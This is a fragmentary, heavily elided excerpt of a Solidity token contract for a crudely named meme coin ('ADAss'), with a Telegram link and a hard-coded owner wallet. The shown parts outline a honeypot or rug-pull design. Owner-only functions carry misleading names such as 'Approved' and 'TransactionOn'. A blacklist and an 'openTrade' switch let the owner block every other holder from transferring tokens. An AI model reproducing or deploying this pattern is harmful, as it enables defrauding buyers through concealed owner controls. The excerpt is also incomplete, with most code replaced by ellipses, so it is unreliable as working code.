...
// *Telegram : https://t.me/AnalDustAss
...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0x09e91987bA3D226737013E45267d9C2b93594f41;
...
contract AnalDustAss is Context, IERC20, Ownable { 
    ...
    */
    ...
    address payable private Wallet_Dev = payable(0x09e91987bA3D226737013E45267d9C2b93594f41);
    ...
    */
    ...
    string private _name = "Anal Dust's Ass"; 
    string private _symbol = "ADAss";  
    ...
    */
    ...
    function TradingVolume_Start(address account) public onlyOwner {
    ...
    */
    ...
    function blacklist_Add_Wallet(address _address) external onlyOwner {
    ...
    function Approved(address _address) external onlyOwner {
    ...
    function OpenStatus(bool _opentrade) external onlyOwner{
    	openTrade = _opentrade;
    }


    // Blacklist - block wallets (REMOVE - COMMA SEPARATE MULTIPLE WALLETS)
    function TransactionOn(address[] calldata addresses) external onlyOwner {
    ...
    function Transactionoff(address addresses) external onlyOwner {
    ...
    function _transfer(
        ...
        */
        ...
        if (from != owner() && to != owner()){
            ...
            require(openTrade || _isWhitelisted[from] || _isWhitelisted[to]);
        }
